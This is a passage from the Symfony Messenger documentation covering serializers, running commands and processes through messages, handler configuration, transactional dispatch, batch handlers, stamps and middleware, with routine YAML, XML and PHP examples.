                        <framework:symfony-serializer format="json">
                            <framework:context/>
                        </framework:symfony-serializer>
                    </framework:serializer>

                    <framework:transport name="async_priority_normal" dsn="..." serializer="messenger.transport.symfony_serializer"/>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->serializer()
                ->defaultSerializer('messenger.transport.symfony_serializer')
                ->symfonySerializer()
                    ->format('json')
                    ->context('foo', 'bar');

            $messenger->transport('async_priority_normal')
                ->dsn('...')
                ->serializer('messenger.transport.symfony_serializer');
        };

The ``messenger.transport.symfony_serializer`` is a built-in service that uses
the :doc:`Serializer component </serializer>` and can be configured in a few ways.
If you *do* choose to use the Symfony serializer, you can control the context
on a case-by-case basis via the :class:`Symfony\\Component\\Messenger\\Stamp\\SerializerStamp`
(see `Envelopes & Stamps`_).

.. tip::

    When sending/receiving messages to/from another application, you may need
    more control over the serialization process. Using a custom serializer
    provides that control. See `SymfonyCasts' message serializer tutorial`_ for
    details.

Running Commands And External Processes
---------------------------------------

Trigger a Command
~~~~~~~~~~~~~~~~~

It is possible to trigger any command by dispatching a
:class:`Symfony\\Component\\Console\\Messenger\\RunCommandMessage`. Symfony
will take care of handling this message and execute the command passed
to the message parameter::

    use Symfony\Component\Console\Messenger\RunCommandMessage;
    use Symfony\Component\Messenger\MessageBusInterface;

    class CleanUpService
    {
        public function __construct(private readonly MessageBusInterface $bus)
        {
        }

        public function cleanUp(): void
        {
            // Long task with some caching...

            // Once finished, dispatch some clean up commands
            $this->bus->dispatch(new RunCommandMessage('app:my-cache:clean-up --dir=var/temp'));
            $this->bus->dispatch(new RunCommandMessage('cache:clear'));
        }
    }

You can configure the behavior in the case of something going wrong during command
execution. To do so, you can use the ``throwOnFailure`` and ``catchExceptions``
parameters when creating your instance of
:class:`Symfony\\Component\\Console\\Messenger\\RunCommandMessage`.

Once handled, the handler will return a
:class:`Symfony\\Component\\Console\\Messenger\\RunCommandContext` which
contains many useful information such as the exit code or the output of the
process. You can refer to the page dedicated on
:ref:`handler results <messenger-getting-handler-results>` for more information.

Trigger An External Process
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Messenger comes with a handy helper to run external processes by
dispatching a message. This takes advantages of the
:doc:`Process component </components/process>`. By dispatching a
:class:`Symfony\\Component\\Process\\Messenger\\RunProcessMessage`, Messenger
will take care of creating a new process with the parameters you passed::

    use Symfony\Component\Messenger\MessageBusInterface;
    use Symfony\Component\Process\Messenger\RunProcessMessage;

    class CleanUpService
    {
        public function __construct(private readonly MessageBusInterface $bus)
        {
        }

        public function cleanUp(): void
        {
            $this->bus->dispatch(new RunProcessMessage(['rm', '-rf', 'var/log/temp/*'], cwd: '/my/custom/working-dir'));

            // ...
        }
    }

Once handled, the handler will return a
:class:`Symfony\\Component\\Process\\Messenger\\RunProcessContext` which
contains many useful information such as the exit code or the output of the
process. You can refer to the page dedicated on
:ref:`handler results <messenger-getting-handler-results>` for more information.

Pinging A Webservice
--------------------

Sometimes, you may need to regularly ping a webservice to get its status, e.g.
is it up or down. It is possible to do so by dispatching a
:class:`Symfony\\Component\\HttpClient\\Messenger\\PingWebhookMessage`::

    use Symfony\Component\HttpClient\Messenger\PingWebhookMessage;
    use Symfony\Component\Messenger\MessageBusInterface;

    class LivenessService
    {
        public function __construct(private readonly MessageBusInterface $bus)
        {
        }

        public function ping(): void
        {
            // An HttpExceptionInterface is thrown on 3xx/4xx/5xx
            $this->bus->dispatch(new PingWebhookMessage('GET', 'https://example.com/status'));

            // Ping, but does not throw on 3xx/4xx/5xx
            $this->bus->dispatch(new PingWebhookMessage('GET', 'https://example.com/status', throw: false));

            // Any valid HttpClientInterface option can be used
            $this->bus->dispatch(new PingWebhookMessage('POST', 'https://example.com/status', [
                'headers' => [
                    'Authorization' => 'Bearer ...'
                ],
                'json' => [
                    'data' => 'some-data',
                ],
            ]));
        }
    }

The handler will return a
:class:`Symfony\\Contracts\\HttpClient\\ResponseInterface`, allowing you to
gather and process information returned by the HTTP request.

Getting Results from your Handlers
----------------------------------

When a message is handled, the :class:`Symfony\\Component\\Messenger\\Middleware\\HandleMessageMiddleware`
adds a :class:`Symfony\\Component\\Messenger\\Stamp\\HandledStamp` for each object that handled the message.
You can use this to get the value returned by the handler(s)::

    use Symfony\Component\Messenger\MessageBusInterface;
    use Symfony\Component\Messenger\Stamp\HandledStamp;

    $envelope = $messageBus->dispatch(new SomeMessage());

    // get the value that was returned by the last message handler
    $handledStamp = $envelope->last(HandledStamp::class);
    $handledStamp->getResult();

    // or get info about all of handlers
    $handledStamps = $envelope->all(HandledStamp::class);

.. _messenger-getting-handler-results:

Getting Results when Working with Command & Query Buses
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Messenger component can be used in CQRS architectures where command & query
buses are central pieces of the application. Read Martin Fowler's
`article about CQRS`_ to learn more and
:ref:`how to configure multiple buses <messenger-multiple-buses>`.

As queries are usually synchronous and expected to be handled once,
getting the result from the handler is a common need.

A :class:`Symfony\\Component\\Messenger\\HandleTrait` exists to get the result
of the handler when processing synchronously. It also ensures that exactly one
handler is registered. The ``HandleTrait`` can be used in any class that has a
``$messageBus`` property::

    // src/Action/ListItems.php
    namespace App\Action;

    use App\Message\ListItemsQuery;
    use App\MessageHandler\ListItemsQueryResult;
    use Symfony\Component\Messenger\HandleTrait;
    use Symfony\Component\Messenger\MessageBusInterface;

    class ListItems
    {
        use HandleTrait;

        public function __construct(
            private MessageBusInterface $messageBus,
        ) {
        }

        public function __invoke(): void
        {
            $result = $this->query(new ListItemsQuery(/* ... */));

            // Do something with the result
            // ...
        }

        // Creating such a method is optional, but allows type-hinting the result
        private function query(ListItemsQuery $query): ListItemsQueryResult
        {
            return $this->handle($query);
        }
    }

Hence, you can use the trait to create command & query bus classes.
For example, you could create a special ``QueryBus`` class and inject it
wherever you need a query bus behavior instead of the ``MessageBusInterface``::

    // src/MessageBus/QueryBus.php
    namespace App\MessageBus;

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\HandleTrait;
    use Symfony\Component\Messenger\MessageBusInterface;

    class QueryBus
    {
        use HandleTrait;

        public function __construct(
            private MessageBusInterface $messageBus,
        ) {
        }

        /**
         * @param object|Envelope $query
         *
         * @return mixed The handler returned value
         */
        public function query($query): mixed
        {
            return $this->handle($query);
        }
    }

Customizing Handlers
--------------------

Configuring Handlers Using Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can configure your handler by passing options to the attribute::

    // src/MessageHandler/SmsNotificationHandler.php
    namespace App\MessageHandler;

    use App\Message\OtherSmsNotification;
    use App\Message\SmsNotification;
    use Symfony\Component\Messenger\Attribute\AsMessageHandler;

    #[AsMessageHandler(fromTransport: 'async', priority: 10)]
    class SmsNotificationHandler
    {
        public function __invoke(SmsNotification $message): void
        {
            // ...
        }
    }

Possible options to configure with the attribute are:

==============================  ====================================================================================================
Option                          Description
==============================  ====================================================================================================
``bus``                         Name of the bus from which the handler can receive messages, by default all buses.
``fromTransport``               Name of the transport from which the handler can receive messages, by default all transports.
``handles``                     Type of messages (FQCN) that can be processed by the handler, only needed if can't be guessed by
                                type-hint.
``method``                      Name of the method that will process the message, only if the target is a class.
``priority``                    Priority of the handler when multiple handlers can process the same message.
==============================  ====================================================================================================

.. _messenger-handler-config:

Manually Configuring Handlers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony will normally :ref:`find and register your handler automatically <messenger-handler>`.
But, you can also configure a handler manually - and pass it some extra config -
by tagging the handler service with ``messenger.message_handler``

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\MessageHandler\SmsNotificationHandler:
                tags: [messenger.message_handler]

                # or configure with options
                tags:
                    -
                        name: messenger.message_handler
                        # only needed if can't be guessed by type-hint
                        handles: App\Message\SmsNotification

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\MessageHandler\SmsNotificationHandler">
                     <!-- handles is only needed if it can't be guessed by type-hint -->
                     <tag name="messenger.message_handler"
                          handles="App\Message\SmsNotification"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Message\SmsNotification;
        use App\MessageHandler\SmsNotificationHandler;

        $container->register(SmsNotificationHandler::class)
            ->addTag('messenger.message_handler', [
                // only needed if can't be guessed by type-hint
                'handles' => SmsNotification::class,
            ]);

Possible options to configure with tags are:

============================  ====================================================================================================
Option                        Description
============================  ====================================================================================================
``bus``                       Name of the bus from which the handler can receive messages, by default all buses.
``from_transport``            Name of the transport from which the handler can receive messages, by default all transports.
``handles``                   Type of messages (FQCN) that can be processed by the handler, only needed if can't be guessed by
                              type-hint.
``method``                    Name of the method that will process the message.
``priority``                  Priority of the handler when multiple handlers can process the same message.
============================  ====================================================================================================

.. _handler-subscriber-options:

Handling Multiple Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~

A single handler class can handle multiple messages. For that add the
``#AsMessageHandler`` attribute to all the handling methods::

    // src/MessageHandler/SmsNotificationHandler.php
    namespace App\MessageHandler;

    use App\Message\OtherSmsNotification;
    use App\Message\SmsNotification;

    class SmsNotificationHandler
    {
        #[AsMessageHandler]
        public function handleSmsNotification(SmsNotification $message): void
        {
            // ...
        }

        #[AsMessageHandler]
        public function handleOtherSmsNotification(OtherSmsNotification $message): void
        {
            // ...
        }
    }

.. _messenger-transactional-messages:

Transactional Messages: Handle New Messages After Handling is Done
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

A message handler can ``dispatch`` new messages while handling others, to either
the same or a different bus (if the application has
:ref:`multiple buses <messenger-multiple-buses>`). Any errors or exceptions that
occur during this process can have unintended consequences, such as:

#. If using the ``DoctrineTransactionMiddleware`` and a dispatched message throws
   an exception, then any database transactions in the original handler will be
   rolled back.
#. If the message is dispatched to a different bus, then the dispatched message
   will be handled even if some code later in the current handler throws an exception.

An Example ``RegisterUser`` Process
...................................

Consider an application with both a *command* and an *event* bus. The application
dispatches a command named ``RegisterUser`` to the command bus. The command is
handled by the ``RegisterUserHandler`` which creates a ``User`` object, stores
that object to a database and dispatches a ``UserRegistered`` message to the event bus.

There are many handlers to the ``UserRegistered`` message, one handler may send
a welcome email to the new user. We are using the ``DoctrineTransactionMiddleware``
to wrap all database queries in one database transaction.

**Problem 1:** If an exception is thrown when sending the welcome email, then
the user will not be created because the ``DoctrineTransactionMiddleware`` will
rollback the Doctrine transaction, in which the user has been created.

**Problem 2:** If an exception is thrown when saving the user to the database,
the welcome email is still sent because it is handled asynchronously.

DispatchAfterCurrentBusMiddleware Middleware
............................................

For many applications, the desired behavior is to *only* handle messages that
are dispatched by a handler once that handler has fully finished. This can be done by
using the ``DispatchAfterCurrentBusMiddleware`` and adding a
``DispatchAfterCurrentBusStamp`` stamp to :ref:`the message Envelope <messenger-envelopes>`::

    // src/Messenger/CommandHandler/RegisterUserHandler.php
    namespace App\Messenger\CommandHandler;

    use App\Entity\User;
    use App\Messenger\Command\RegisterUser;
    use App\Messenger\Event\UserRegistered;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\MessageBusInterface;
    use Symfony\Component\Messenger\Stamp\DispatchAfterCurrentBusStamp;

    class RegisterUserHandler
    {
        public function __construct(
            private MessageBusInterface $eventBus,
            private EntityManagerInterface $em,
        ) {
        }

        public function __invoke(RegisterUser $command): void
        {
            $user = new User($command->getUuid(), $command->getName(), $command->getEmail());
            $this->em->persist($user);

            // The DispatchAfterCurrentBusStamp marks the event message to be handled
            // only if this handler does not throw an exception.

            $event = new UserRegistered($command->getUuid());
            $this->eventBus->dispatch(
                (new Envelope($event))
                    ->with(new DispatchAfterCurrentBusStamp())
            );

            // ...
        }
    }

.. code-block:: php

    // src/Messenger/EventSubscriber/WhenUserRegisteredThenSendWelcomeEmail.php
    namespace App\Messenger\EventSubscriber;

    use App\Entity\User;
    use App\Messenger\Event\UserRegistered;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Component\Mime\RawMessage;

    class WhenUserRegisteredThenSendWelcomeEmail
    {
        public function __construct(
            private MailerInterface $mailer,
            EntityManagerInterface $em,
        ) {
        }

        public function __invoke(UserRegistered $event): void
        {
            $user = $this->em->getRepository(User::class)->find($event->getUuid());

            $this->mailer->send(new RawMessage('Welcome '.$user->getFirstName()));
        }
    }

This means that the ``UserRegistered`` message would not be handled until
*after* the ``RegisterUserHandler`` had completed and the new ``User`` was
persisted to the database. If the ``RegisterUserHandler`` encounters an
exception, the ``UserRegistered`` event will never be handled. And if an
exception is thrown while sending the welcome email, the Doctrine transaction
will not be rolled back.

.. note::

    If ``WhenUserRegisteredThenSendWelcomeEmail`` throws an exception, that
    exception will be wrapped into a ``DelayedMessageHandlingException``. Using
    ``DelayedMessageHandlingException::getWrappedExceptions`` will give you all
    exceptions that are thrown while handling a message with the
    ``DispatchAfterCurrentBusStamp``.

The ``dispatch_after_current_bus`` middleware is enabled by default. If you're
configuring your middleware manually, be sure to register
``dispatch_after_current_bus`` before ``doctrine_transaction`` in the middleware
chain. Also, the ``dispatch_after_current_bus`` middleware must be loaded for
*all* of the buses being used.

Binding Handlers to Different Transports
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Each message can have multiple handlers, and when a message is consumed
*all* of its handlers are called. But you can also configure a handler to only
be called when it's received from a *specific* transport. This allows you to
have a single message where each handler is called by a different "worker"
that's consuming a different transport.

Suppose you have an ``UploadedImage`` message with two handlers:

* ``ThumbnailUploadedImageHandler``: you want this to be handled by
  a transport called ``image_transport``

* ``NotifyAboutNewUploadedImageHandler``: you want this to be handled
  by a transport called ``async_priority_normal``

To do this, add the ``from_transport`` option to each handler. For example::

    // src/MessageHandler/ThumbnailUploadedImageHandler.php
    namespace App\MessageHandler;

    use App\Message\UploadedImage;

    #[AsMessageHandler(fromTransport: 'image_transport')]
    class ThumbnailUploadedImageHandler
    {
        public function __invoke(UploadedImage $uploadedImage): void
        {
            // do some thumbnailing
        }
    }

And similarly::

    // src/MessageHandler/NotifyAboutNewUploadedImageHandler.php
    // ...

    #[AsMessageHandler(fromTransport: 'async_priority_normal')]
    class NotifyAboutNewUploadedImageHandler
    {
        // ...
    }

Then, make sure to "route" your message to *both* transports:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async_priority_normal: # ...
                    image_transport: # ...

                routing:
                    # ...
                    'App\Message\UploadedImage': [image_transport, async_priority_normal]

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async_priority_normal" dsn="..."/>
                    <framework:transport name="image_transport" dsn="..."/>

                    <framework:routing message-class="App\Message\UploadedImage">
                        <framework:sender service="image_transport"/>
                        <framework:sender service="async_priority_normal"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('async_priority_normal')->dsn('...');
            $messenger->transport('image_transport')->dsn('...');

            $messenger->routing('App\Message\UploadedImage')
                ->senders(['image_transport', 'async_priority_normal']);
        };

That's it! You can now consume each transport:

.. code-block:: terminal

    # will only call ThumbnailUploadedImageHandler when handling the message
    $ php bin/console messenger:consume image_transport -vv

    $ php bin/console messenger:consume async_priority_normal -vv

.. caution::

    If a handler does *not* have ``from_transport`` config, it will be executed
    on *every* transport that the message is received from.

Process Messages by Batches
~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can declare "special" handlers which will process messages by batch.
By doing so, the handler will wait for a certain amount of messages to be
pending before processing them. The declaration of a batch handler is done
by implementing
:class:`Symfony\\Component\\Messenger\\Handler\\BatchHandlerInterface`. The
:class:`Symfony\\Component\\Messenger\\Handler\\BatchHandlerTrait` is also
provided in order to ease the declaration of these special handlers::

    use Symfony\Component\Messenger\Handler\Acknowledger;
    use Symfony\Component\Messenger\Handler\BatchHandlerInterface;
    use Symfony\Component\Messenger\Handler\BatchHandlerTrait;

    class MyBatchHandler implements BatchHandlerInterface
    {
        use BatchHandlerTrait;

        public function __invoke(MyMessage $message, ?Acknowledger $ack = null): mixed
        {
            return $this->handle($message, $ack);
        }

        private function process(array $jobs): void
        {
            foreach ($jobs as [$message, $ack]) {
                try {
                    // Compute $result from $message...

                    // Acknowledge the processing of the message
                    $ack->ack($result);
                } catch (\Throwable $e) {
                    $ack->nack($e);
                }
            }
        }

        // Optionally, you can either redefine the `shouldFlush()` method
        // of the trait to define your own batch size...
        private function shouldFlush(): bool
        {
            return 100 <= \count($this->jobs);
        }

        // ... or redefine the `getBatchSize()` method if the default
        // flush behavior suits your needs
        private function getBatchSize(): int
        {
            return 100;
        }
    }

.. note::

    When the ``$ack`` argument of ``__invoke()`` is ``null``, the message is
    expected to be handled synchronously. Otherwise, ``__invoke()`` is
    expected to return the number of pending messages. The
    :class:`Symfony\\Component\\Messenger\\Handler\\BatchHandlerTrait` handles
    this for you.

.. note::

    By default, pending batches are flushed when the worker is idle as well
    as when it is stopped.

Extending Messenger
-------------------

Envelopes & Stamps
~~~~~~~~~~~~~~~~~~

A message can be any PHP object. Sometimes, you may need to configure something
extra about the message - like the way it should be handled inside AMQP or adding
a delay before the message should be handled. You can do that by adding a "stamp"
to your message::

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\MessageBusInterface;
    use Symfony\Component\Messenger\Stamp\DelayStamp;

    public function index(MessageBusInterface $bus): void
    {
        $bus->dispatch(new SmsNotification('...'), [
            // wait 5 seconds before processing
            new DelayStamp(5000),
        ]);

        // or explicitly create an Envelope
        $bus->dispatch(new Envelope(new SmsNotification('...'), [
            new DelayStamp(5000),
        ]));

        // ...
    }

Internally, each message is wrapped in an ``Envelope``, which holds the message
and stamps. You can create this manually or allow the message bus to do it. There
are a variety of different stamps for different purposes and they're used internally
to track information about a message - like the message bus that's handling it
or if it's being retried after failure.

.. _messenger_middleware:

Middleware
~~~~~~~~~~

What happens when you dispatch a message to a message bus depends on its
collection of middleware and their order. By default, the middleware configured
for each bus looks like this:

#. ``add_bus_name_stamp_middleware`` - adds a stamp to record which bus this
   message was dispatched into;

#. ``dispatch_after_current_bus``- see :ref:`messenger-transactional-messages`;

#. ``failed_message_processing_middleware`` - processes messages that are being
   retried via the :ref:`failure transport <messenger-failure-transport>` to make
   them properly function as if they were being received from their original transport;

#. Your own collection of middleware_;

#. ``send_message`` - if routing is configured for the transport, this sends
   messages to that transport and stops the middleware chain;

#. ``handle_message`` - calls the message handler(s) for the given message.

.. note::

    These middleware names are actually shortcut names. The real service ids
    are prefixed with ``messenger.middleware.`` (e.g. ``messenger.middleware.handle_message``).

The middleware are executed when the message is dispatched but *also* again when
a message is received via the worker (for messages that were sent to a transport
to be handled asynchronously). Keep this in mind if you create your own middleware.

You can add your own middleware to this list, or completely disable the default
middleware and *only* include your own.

If a middleware service is abstract, you can configure its constructor's arguments
and a different instance will be created per bus.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                buses:
                    messenger.bus.default:
                        # disable the default middleware
                        default_middleware: false

                        middleware:
                            # use and configure parts of the default middleware you want
                            - 'add_bus_name_stamp_middleware': ['messenger.bus.default']

                            # add your own services that implement Symfony\Component\Messenger\Middleware\MiddlewareInterface
                            - 'App\Middleware\MyMiddleware'
                            - 'App\Middleware\AnotherMiddleware'

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <!-- default-middleware: disable the default middleware -->
                    <framework:bus name="messenger.bus.default" default-middleware="false">

                        <!-- use and configure parts of the default middleware you want -->
                        <framework:middleware id="add_bus_name_stamp_middleware">
                            <framework:argument>messenger.bus.default</framework:argument>
                        </framework:middleware>

                        <!-- add your own services that implement Symfony\Component\Messenger\Middleware\MiddlewareInterface -->
                        <framework:middleware id="App\Middleware\MyMiddleware"/>
                        <framework:middleware id="App\Middleware\AnotherMiddleware"/>
                    </framework:bus>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $bus = $messenger->bus('messenger.bus.default')
                ->defaultMiddleware(false); // disable the default middleware

            // use and configure parts of the default middleware you want
            $bus->middleware()->id('add_bus_name_stamp_middleware')->arguments(['messenger.bus.default']);

            // add your own services that implement Symfony\Component\Messenger\Middleware\MiddlewareInterface
            $bus->middleware()->id('App\Middleware\MyMiddleware');
            $bus->middleware()->id('App\Middleware\AnotherMiddleware');
        };

.. _middleware-doctrine:

Middleware for Doctrine
~~~~~~~~~~~~~~~~~~~~~~~

If you use Doctrine in your app, a number of optional middleware exist that you
may want to use:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                buses:
                    command_bus:
                        middleware:
                            # each time a message is handled, the Doctrine connection
                            # is "pinged" and reconnected if it's closed. Useful
                            # if your workers run for a long time and the database
                            # connection is sometimes lost
                            - doctrine_ping_connection

                            # After handling, the Doctrine connection is closed,
                            # which can free up database connections in a worker,
                            # instead of keeping them open forever
                            - doctrine_close_connection

                            # logs an error when a Doctrine transaction was opened but not closed
                            - doctrine_open_transaction_logger

                            # wraps all handlers in a single Doctrine transaction
                            # handlers do not need to call flush() and an error
                            # in any handler will cause a rollback
                            - doctrine_transaction

                            # or pass a different entity manager to any
                            #- doctrine_transaction: ['custom']

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:bus name="command_bus">
                        <framework:middleware id="doctrine_transaction"/>
                        <framework:middleware id="doctrine_ping_connection"/>
                        <framework:middleware id="doctrine_close_connection"/>
                        <framework:middleware id="doctrine_open_transaction_logger"/>

                        <!-- or pass a different entity manager to any -->
                        <!--
                        <framework:middleware id="doctrine_transaction">
                            <framework:argument>custom</framework:argument>
                        </framework:middleware>
                        -->
                    </framework:bus>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $bus = $messenger->bus('command_bus');
            $bus->middleware()->id('doctrine_transaction');
            $bus->middleware()->id('doctrine_ping_connection');
            $bus->middleware()->id('doctrine_close_connection');
            $bus->middleware()->id('doctrine_open_transaction_logger');
            // Using another entity manager
            $bus->middleware()->id('doctrine_transaction')
                ->arguments(['custom']);
        };

Other Middlewares
~~~~~~~~~~~~~~~~~

Add the ``router_context`` middleware if you need to generate absolute URLs in
the consumer (e.g. render a template with links). This middleware stores the
original request context (i.e. the host, the HTTP port, etc.) which is needed
when building absolute URLs.

Add the ``validation`` middleware if you need to validate the message
object using the :doc:`Validator component </components/validator>` before handling it.
If validation fails, a ``ValidationFailedException`` will be thrown. The
:class:`Symfony\\Component\\Messenger\\Stamp\\ValidationStamp` can be used
to configure the validation groups.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                buses:
                    command_bus:
                        middleware:
                            - router_context
                            - validation

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:bus name="command_bus">
                        <framework:middleware id="router_context"/>
                        <framework:middleware id="validation"/>
                    </framework:bus>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $bus = $messenger->bus('command_bus');
            $bus->middleware()->id('router_context');
            $bus->middleware()->id('validation');
        };

Messenger Events
~~~~~~~~~~~~~~~~

In addition to middleware, Messenger also dispatches several events. You can
:doc:`create an event listener </event_dispatcher>` to hook into various parts
of the process. For each, the event class is the event name:

* :class:`Symfony\\Component\\Messenger\\Event\\SendMessageToTransportsEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerMessageFailedEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerMessageHandledEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerMessageReceivedEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerMessageRetriedEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerRateLimitedEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerRunningEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerStartedEvent`
* :class:`Symfony\\Component\\Messenger\\Event\\WorkerStoppedEvent`

Additional Handler Arguments
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It's possible to have messenger pass additional data to the message handler
using the :class:`Symfony\\Component\\Messenger\\Stamp\\HandlerArgumentsStamp`.
Add this stamp to the envelope in a middleware and fill it with any additional
data you want to have available in the handler::

    // src/Messenger/AdditionalArgumentMiddleware.php
    namespace App\Messenger;

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Middleware\MiddlewareInterface;
    use Symfony\Component\Messenger\Middleware\StackInterface;
    use Symfony\Component\Messenger\Stamp\HandlerArgumentsStamp;

    final class AdditionalArgumentMiddleware implements MiddlewareInterface
    {
        public function handle(Envelope $envelope, StackInterface $stack): Envelope
        {
            $envelope = $envelope->with(new HandlerArgumentsStamp([
                $this->resolveAdditionalArgument($envelope->getMessage()),
            ]));

            return $stack->next()->handle($envelope, $stack);
        }

        private function resolveAdditionalArgument(object $message): mixed
        {
            // ...
        }
    }

Then your handler will look like this::

    // src/MessageHandler/SmsNotificationHandler.php
    namespace App\MessageHandler;

    use App\Message\SmsNotification;

    final class SmsNotificationHandler
    {
        public function __invoke(SmsNotification $message, mixed $additionalArgument)
        {
            // ...
        }
    }

Message Serializer For Custom Data Formats
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you receive messages from other applications, it's possible that they are not
exactly in the format you need. Not all applications will return a JSON message
with ``body`` and ``headers`` fields. In those cases, you'll need to create a
new message serializer implementing the
:class:`Symfony\\Component\\Messenger\\Transport\\Serialization\\SerializerInterface`.
Let's say you want to create a message decoder::

    namespace App\Messenger\Serializer;

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Transport\Serialization\SerializerInterface;

    class MessageWithTokenDecoder implements SerializerInterface
    {
        public function decode(array $encodedEnvelope): Envelope
        {
            $envelope = \json_decode($encodedEnvelope, true);

            try {
                // parse the data you received with your custom fields
                $data = $envelope['data'];
                $data['token'] = $envelope['token'];

                // other operations like getting information from stamps
            } catch (\Throwable $throwable) {
                // wrap any exception that may occur in the envelope to send it to the failure transport
                return new Envelope($throwable);
            }

            return new Envelope($data);
        }

        public function encode(Envelope $envelope): array
        {
            // this decoder does not encode messages, but you can implement it by returning
            // an array with serialized stamps if you need to send messages in a custom format
            throw new \LogicException('This serializer is only used for decoding messages.');
        }
    }

The next step is to tell Symfony to use this serializer in one or more of your
transports:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    my_transport:
                        dsn: '%env(MY_TRANSPORT_DSN)%'
                        serializer: 'App\Messenger\Serializer\MessageWithTokenDecoder'

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
